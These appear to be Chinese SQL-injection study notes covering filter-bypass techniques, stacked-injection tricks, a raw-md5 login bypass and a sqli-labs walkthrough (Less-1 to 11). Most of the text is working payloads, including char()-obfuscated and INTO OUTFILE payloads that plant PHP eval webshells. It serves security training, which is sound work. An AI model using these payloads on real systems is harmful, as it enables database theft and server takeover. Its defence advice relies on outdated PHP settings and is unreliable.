<h4 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h4><p>GBK 编码会认为两个字符为一个汉字，例如：<code>DF5C</code>就是一个汉字”運”。</p>
<blockquote>
<p>GBK编码在线查询：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifuji.php">https://www.qqxiuzi.cn/bianma/zifuji.php</a> | <a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/guobiaoma.php">https://www.qqxiuzi.cn/bianma/guobiaoma.php</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df&#x27;union select 1,user(),3 --+</span><br><span class="line">id=-1運&#x27;union select 1,user(),3 --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>URL编码：</p>
<p>%27–单引号 | %20–空格 | %23–#号 | %5c–\反斜杠</p>
</blockquote>
<h3 id="3-4-11-逗号绕过"><a href="#3-4-11-逗号绕过" class="headerlink" title="3.4.11 逗号绕过"></a>3.4.11 逗号绕过</h3><p>sql盲注时常用到以下的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">substr()</span><br><span class="line">substr(string, pos, len) #从第pos个字符开始，取长度为len的子串</span><br><span class="line">substr(string, pos) #从pos开始，取到string的最后</span><br><span class="line"></span><br><span class="line">substring() #用法和substr()一样</span><br><span class="line"></span><br><span class="line">mid()</span><br><span class="line">#用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的</span><br><span class="line"></span><br><span class="line">left()和right()</span><br><span class="line">left(string, len)和right(string, len) #分别是从左或从右取string中长度为len的子串</span><br><span class="line"></span><br><span class="line">limit</span><br><span class="line">limit pos len #在返回项中从pos开始取len个返回值，pos从0开始</span><br><span class="line"></span><br><span class="line">ascii()和char()</span><br><span class="line">ascii(char) #把字符转为ascii码</span><br><span class="line">char(ascii_int) #和ascii()的作用相反，将ascii码转字符</span><br></pre></td></tr></table></figure>

<h4 id="from-pos-for-len"><a href="#from-pos-for-len" class="headerlink" title="from pos for len"></a>from pos for len</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() from 1 <span class="keyword">for</span> 1)=<span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="join关键字绕过"><a href="#join关键字绕过" class="headerlink" title="join关键字绕过"></a>join关键字绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原句：union select 1,2,3,4;</span><br><span class="line">绕过：</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),&#x27; &#x27;,database(),&#x27; &#x27;,@@datadir))D);</span><br><span class="line">#括号后面的A、B、C是随意命名的是省略了as的写法</span><br></pre></td></tr></table></figure>

<h4 id="like关键字"><a href="#like关键字" class="headerlink" title="like关键字"></a>like关键字</h4><p> 适用于substr()等提取子串的函数中的逗号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原句：select ascii(mid(user(),1,1))=80</span><br><span class="line">绕过：select user() like &#x27;r%&#x27;; #查询User是否以r开头</span><br></pre></td></tr></table></figure>

<h4 id="offset关键字"><a href="#offset关键字" class="headerlink" title="offset关键字"></a>offset关键字</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原句：select * from cms_users limit 0,1; #从第0+1个开始，取1个结果返回</span><br><span class="line">绕过：select * from cms_users limit 1 offset 0; #跳过前0条记录，返回接下来的1条记录</span><br></pre></td></tr></table></figure>

<h3 id="3-4-12-过滤函数绕过"><a href="#3-4-12-过滤函数绕过" class="headerlink" title="3.4.12 过滤函数绕过"></a>3.4.12 过滤函数绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sleep() --&gt;benchmark()</span><br><span class="line">#benchmark()，第一个参数是执行次数，第二个是执行的表达式</span><br><span class="line">select 1,2 and sleep(1);</span><br><span class="line">select 1,2 and benchmark(10000000,1);</span><br><span class="line"></span><br><span class="line">ascii()–&gt;hex()、bin()</span><br><span class="line">hex() #将字符转成十六进制</span><br><span class="line">id=1 and if(hex(substr(database(),1,1))=62,1,0)</span><br><span class="line">bin() #将十进制值转换为二进制字符串</span><br><span class="line">&#x27; OR BIN(CONV(HEX(SUBSTR(database(), 1, 1)), 16, 10)) = &#x27;1100001&#x27; -- - #示例来自AI，未验证</span><br><span class="line"></span><br><span class="line">group_concat()–&gt;concat_ws()</span><br><span class="line">CONCAT_WS(separator, string1, string2, ...) </span><br><span class="line">#separator：用于分隔各个字符串的分隔符。string1, string2, ...：需要连接的一个或多个字符串。</span><br><span class="line">SELECT CONCAT_WS(&#x27; &#x27;, first_name, last_name) AS full_name FROM users;</span><br><span class="line">#此查询将返回每个用户的全名，分隔符是空格，例如 &#x27;John Doe&#x27;。</span><br><span class="line"></span><br><span class="line">substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</span><br><span class="line"></span><br><span class="line">ord()–&gt;ascii()</span><br><span class="line">ord() #返回字符串第一个字符的 ASCII 值</span><br><span class="line">1&#x27; and if(ord(substr(database(),1,1))=100,sleep(2),1)#</span><br><span class="line"></span><br><span class="line">if()-&gt;ifnull()|case when then</span><br><span class="line">ifnull(exp_1,exp_2) #如果exp_1不为NULL，则IFNULL函数返回exp_1; 否则返回exp_2。</span><br><span class="line">and ifnull(ascii(substr(database(),1,1))&gt;97,0)</span><br><span class="line">and case when ascii(substr(database(),1,1))&gt;97 then 1 else 0 end</span><br></pre></td></tr></table></figure>

<h3 id="3-4-13-堆叠注入时利用-MySql-预处理"><a href="#3-4-13-堆叠注入时利用-MySql-预处理" class="headerlink" title="3.4.13 堆叠注入时利用 MySql 预处理"></a>3.4.13 堆叠注入时利用 MySql 预处理</h3><blockquote>
<p>堆叠注入：一次性注入并执行多条语句。</p>
<p>1’;show databases;#</p>
</blockquote>
<p>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句。</p>
<p>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用</p>
<p>EXECUTE：执行命令</p>
<p>DEALLOCATE PREPARE：释放命令</p>
<p>SET：用于设置变量(@a)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>

<p>借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure>

<p>也可以不用concat函数，直接用char函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure>

<h3 id="3-4-14-‘“-md5-pass-true-”‘-登录绕过"><a href="#3-4-14-‘“-md5-pass-true-”‘-登录绕过" class="headerlink" title="3.4.14 ‘“.md5($pass,true).”‘ 登录绕过"></a>3.4.14 ‘“.md5($pass,true).”‘ 登录绕过</h3><p>很多站点为了安全都会利用这样的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>ffifdyop</code>，md5加密后为：276f722736c95d99e921722cf9ed621c，16进制解码为字符串后是：<code>&#39;or&#39;6É]\u&#123;99&#125;é!r,ùíb\u&#123;1c&#125;</code>（ASCII），格式为<code>&#39;or&#39;6&lt;trash&gt;</code>，SQL语句变为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;&#x27;or&#x27;6&lt;trash&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>相当于万能密码。</p>
<blockquote>
<p>md5(string,raw) </p>
<p>string：必需，要计算的字符串。</p>
<p>raw：可选。规定十六进制或二进制输出格式：</p>
<ul>
<li>TRUE - 原始16字符二进制格式。</li>
<li>FALSE - 默认。32字符十六进制数。</li>
</ul>
</blockquote>
<h3 id="附录-PHP中一些常见的过滤方法及绕过方式"><a href="#附录-PHP中一些常见的过滤方法及绕过方式" class="headerlink" title="附录 PHP中一些常见的过滤方法及绕过方式"></a>附录 PHP中一些常见的过滤方法及绕过方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字   and or</span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or)/i&#x27;</span>,<span class="variable">$id</span>)</span><br><span class="line">会过滤的攻击代码    1 or 1=1 1 and 1=1</span><br><span class="line">绕过方式    1 || 1=1 1 &amp;&amp; 1=1</span><br><span class="line"></span><br><span class="line">过滤关键字   and or union</span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union)/i&#x27;</span>,<span class="variable">$id</span>)</span><br><span class="line">会过滤的攻击代码    union <span class="keyword">select</span> user,password from <span class="built_in">users</span></span><br><span class="line">绕过方式    1 &amp;&amp; (<span class="keyword">select</span> user from <span class="built_in">users</span> <span class="built_in">where</span> userid=1)=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">过滤关键字   and or union <span class="built_in">where</span></span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where)/i&#x27;</span>,<span class="variable">$id</span>)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (<span class="keyword">select</span> user from <span class="built_in">users</span> <span class="built_in">where</span> user_id = 1) = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式    1 &amp;&amp; (<span class="keyword">select</span> user from <span class="built_in">users</span> <span class="built_in">limit</span> 1) = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">过滤关键字   and, or, union, <span class="built_in">where</span>, <span class="built_in">limit</span></span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where|limit)/i&#x27;</span>, <span class="variable">$id</span>)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (<span class="keyword">select</span> user from <span class="built_in">users</span> <span class="built_in">limit</span> 1) = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式    1 &amp;&amp; (<span class="keyword">select</span> user from <span class="built_in">users</span> group by user_id having user_id = 1) = <span class="string">&#x27;admin&#x27;</span> <span class="comment">#user_id聚合中user_id为1的user为admin</span></span><br><span class="line"></span><br><span class="line">过滤关键字   and, or, union, <span class="built_in">where</span>, <span class="built_in">limit</span>, group by</span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where|limit|group by)/i&#x27;</span>, <span class="variable">$id</span>)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (<span class="keyword">select</span> user from <span class="built_in">users</span> group by user_id having user_id = 1) = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式    1 &amp;&amp; (<span class="keyword">select</span> substr(group_concat(user_id),1,1) user from <span class="built_in">users</span> ) = 1</span><br><span class="line"></span><br><span class="line">过滤关键字   and, or, union, <span class="built_in">where</span>, <span class="built_in">limit</span>, group by, <span class="keyword">select</span></span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where|limit|group by|select)/i&#x27;</span>, <span class="variable">$id</span>)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (<span class="keyword">select</span> substr(gruop_concat(user_id),1,1) user from <span class="built_in">users</span>) = 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">过滤关键字   and, or, union, <span class="built_in">where</span>, <span class="built_in">limit</span>, group by, <span class="keyword">select</span>, <span class="string">&#x27;</span></span><br><span class="line"><span class="string">php代码   preg_match(&#x27;</span>/(and|or|union|<span class="built_in">where</span>|<span class="built_in">limit</span>|group by|<span class="keyword">select</span>|\&#x27;)/i<span class="string">&#x27;, $id)</span></span><br><span class="line"><span class="string">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1</span></span><br><span class="line"><span class="string">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤关键字   and, or, union, where, limit, group by, select, &#x27;</span>, hex</span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where|limit|group by|select|\&#x27;</span>|hex)/i<span class="string">&#x27;, $id)</span></span><br><span class="line"><span class="string">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string">绕过方式    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤关键字   and, or, union, where, limit, group by, select, &#x27;</span>, hex, substr</span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where|limit|group by|select|\&#x27;</span>|hex|substr)/i<span class="string">&#x27;, $id)</span></span><br><span class="line"><span class="string">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;</span></span><br><span class="line"><span class="string">绕过方式    1 &amp;&amp; lpad(user,7,1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤关键字   and, or, union, where, limit, group by, select, &#x27;</span>, hex, substr, 空格</span><br><span class="line">php代码   preg_match(<span class="string">&#x27;/(and|or|union|where|limit|group by|select|\&#x27;</span>|hex|substr|\s)/i<span class="string">&#x27;, $id)</span></span><br><span class="line"><span class="string">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)/td&gt;</span></span><br><span class="line"><span class="string">绕过方式    1%0b||%0blpad(user,7,1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤关键字   and or union where</span></span><br><span class="line"><span class="string">php代码   preg_match(&#x27;</span>/(and|or|union|<span class="built_in">where</span>)/i<span class="string">&#x27;,$id)</span></span><br><span class="line"><span class="string">会过滤的攻击代码    1 || (select user from users where user_id = 1) = &#x27;</span>admin<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式    1 || (select user from users limit 1) = &#x27;</span>admin<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="注入防护"><a href="#注入防护" class="headerlink" title="注入防护"></a>注入防护</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.对提交的数据进行数据类型判断，比如id值必须是数字：is_numeric($id)</span><br><span class="line">2.对提交的数据进行正则匹配,禁止出现注入语句，比如union、or、and等。</span><br><span class="line">3.对提交的数据进行特殊符号转义，比如单引号、双引号等，用addslashs等函数加工一下。</span><br><span class="line">4.参数化查询，也叫做参数绑定的方式，对提交的参数进行预编译然后进行参数绑定，这样会将用户提交的注入语句作为参数值处理，而不是当作SQL语句执行，这样可以有效防范SQL注入。</span><br><span class="line">但预编译不能完全解决SQL注入问题，比如查询语句中表名是动态的，也就是说表名可以是用户提交过来的数据，根据用户提交的表名来进行不同的查询，那么也会出现SQL注入漏洞，因为表名不能进行预编译及参数绑定。</span><br><span class="line">这就需要配合白名单进行过滤。</span><br><span class="line">5.分级管理，用户的权限要进行严格控制和划分，服务端代码连接数据库使用的用户禁止使用root等高权限用户。比如对于普通用户，禁止给予数据库建立、删除、修改等相关权限，只有系统管理员才有增、删、改、查的权限等等。</span><br><span class="line">6.数据库中敏感的数据，比如用户密码，加密存储。</span><br><span class="line"></span><br><span class="line">对于PHP语言编写的网站，大都是和mysql数据库结合的，可通过如下几种方法结合起来防范SQL注入的漏洞：</span><br><span class="line">修改php中默认配置文件php.ini中的配置，来降低sql注入的风险.</span><br><span class="line">参考路径：/usr/local/apache2/conf/php.ini，不同中间件可能位置不一样。</span><br><span class="line">修改如下几项：</span><br><span class="line">safe_mode = on //开启安全模式</span><br><span class="line">magic_quotes_gpc = On //开启过滤函数</span><br><span class="line">display_errors = Off //禁止错误信息提示</span><br><span class="line">注：把magic_quotes_gpc选项打开，在这种情况下所有的客户端GET和POST的数据都会自动进行addslashes处理，所以此时对字符串值的SQL注入是不可行的，但要防止对数字值的SQL注入，如用intval()等函数进行处理。但如果你编写的是通用软件，则需要读取服务器的magic_quotes_gpc后进行相应处理。</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>sqli-labs训练平台靶场详解:<a target="_blank" rel="noopener" href="https://blog.csdn.net/ytdd66/article/details/136466713">https://blog.csdn.net/ytdd66/article/details/136466713</a></p>
<h3 id="Less-1-20"><a href="#Less-1-20" class="headerlink" title="Less - 1~20"></a>Less - 1~20</h3><p>Less - 1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; order by 3 --+ #正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by 4 --+ <span class="comment">#报错</span></span><br><span class="line"><span class="comment">#说明有3列</span></span><br><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,3--+ #回显 2 3</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="keyword">select</span> 1,database(),user()--+ <span class="comment">#回显数据库名，用户名</span></span><br><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union SELECT 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA --+ #查询所有数据库</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema = <span class="string">&#x27;security&#x27;</span> --+ <span class="comment">#查询指定库中的表</span></span><br><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union SELECT 1,group_concat(column_name),3 FROM information_schema.COLUMNS WHERE table_schema = &#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; --+ #查询表中所有字段</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union SELECT 1,group_concat(<span class="built_in">id</span>,username,password),3 FROM security.users --+ <span class="comment">#查询表中数据</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3 --+ <span class="comment">#回显 2 3</span></span><br><span class="line"><span class="comment">#参考Less-1</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1\ <span class="comment">#由报错判断闭合为 &#x27;)</span></span><br><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,3 --+ #回显 2 3</span></span><br><span class="line"><span class="string">#参考Less-1</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-4</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,3 --+ #回显 2 3</span></span><br><span class="line"><span class="string">#参考Less-1</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-5</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1, concat(&#x27;</span>&gt;&gt;<span class="string">&#x27;,(select database()),&#x27;</span>&lt;&lt;<span class="string">&#x27;),1) --+ #获取数据库</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and updatexml(1, substr(concat(<span class="string">&#x27;&gt;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(schema_name) FROM information_schema.SCHEMATA),<span class="string">&#x27;&lt;&lt;&#x27;</span>),1,100),1) --+  <span class="comment">#截取数据库名</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1, substr(concat(&#x27;</span>&gt;&gt;<span class="string">&#x27;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;</span>security<span class="string">&#x27;),&#x27;</span>&lt;&lt;<span class="string">&#x27;),1,100),1) --+ #查询指定数据库的表并截取</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and updatexml(1, substr(concat(<span class="string">&#x27;&gt;&gt;&#x27;</span>,(SELECT group_concat(column_name) FROM information_schema.COLUMNS WHERE table_schema = <span class="string">&#x27;security&#x27;</span> and table_name=<span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;&lt;&lt;&#x27;</span>),1,100),1) --+ <span class="comment">#查询指定数据库指定表的所有字段</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1, substr(concat(&#x27;</span>&gt;&gt;<span class="string">&#x27;,(select group_concat(id,username,password) from security.users),&#x27;</span>&lt;&lt;<span class="string">&#x27;),1,100),1) --+ #查询指定表的数据</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-6</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot; and updatexml(1, concat(&#x27;&gt;&gt;&#x27;,(select database()),&#x27;&lt;&lt;&#x27;),1) --+ #获取数据库</span></span><br><span class="line"><span class="string">#参考Less-5</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-7</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;)) union select 1,2,&quot;&lt;?php eval($_POST[&#x27;</span>ant<span class="string">&#x27;]); ?&gt;&quot; into outfile &quot;D:\\NetworkSecurity\\phpstudy_pro\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+ #写入木马</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs/Less-7/shell.php #蚁剑连接</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-8</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; order by 3 --+ #正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by 4 --+ <span class="comment">#不显示</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and length(database())&gt;=10 --+ #爆数据库长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr(database(),1,1))&gt;=115 --+ <span class="comment">#爆数据库名</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-9</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(length(database())&gt;=8,sleep(5),1)-- - #爆库名</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-10</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot; and if(length(database())&gt;=8,sleep(5),1)--+ #爆库名</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Less-11</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; order by 2 --+&amp;passwd=&amp;submit=Submit #判断列为2</span></span><br><span class="line"><span class="string">uname=1&#x27;</span> union <span class="keyword">select</span> 1,2 -- +&amp;passwd=&amp;submit=Submit <span class="comment">#回显 1 2</span></span><br><span class="line"><span class="built_in">uname</span>=1<span class="string">&#x27; union select database(),user() -- +&amp;passwd=&amp;submit=Submit #获取数据库名和用户名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=admin&#x27;</span> and updatexml(1, concat(<span class="string">&#x27;&gt;&gt;&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;&lt;&lt;&#x27;</span>),1) --+ &amp;passwd=123456&amp;submit=Submit <span class="comment">#获取数据库名</span></span><br></pre></td></tr></table></figure>

<hr>
<hr>
